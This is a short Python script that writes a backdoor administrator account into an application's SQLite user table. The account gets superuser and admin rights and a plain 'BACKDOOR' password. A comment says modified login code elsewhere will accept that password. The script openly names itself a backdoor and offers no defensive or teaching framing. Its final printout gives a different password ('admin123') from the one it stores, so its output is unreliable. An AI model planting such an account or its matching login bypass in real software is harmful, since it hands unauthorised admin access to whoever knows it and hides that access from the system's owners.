import sqlite3
import os

db_path = "sql_app.db"
conn = sqlite3.connect(db_path)
c = conn.cursor()

email = "auditor_backdoor@algor.com"
# Password is simply "BACKDOOR" string which our modified code will recognize
pwd_hash = "BACKDOOR" 

c.execute("SELECT id FROM users WHERE email=?", (email,))
row = c.fetchone()
if row:
    print("Updating backdoor user...")
    c.execute("UPDATE users SET hashed_password=?, is_active=1, is_superuser=1, role='admin' WHERE email=?", (pwd_hash, email))
else:
    print("Inserting backdoor user...")
    c.execute("INSERT INTO users (email, hashed_password, full_name, is_active, is_superuser, role, phone) VALUES (?, ?, 'System Auditor', 1, 1, 'admin', '+55000')", (email, pwd_hash))

conn.commit()
print(f"Backdoor User Ready: {email} / admin123")
conn.close()
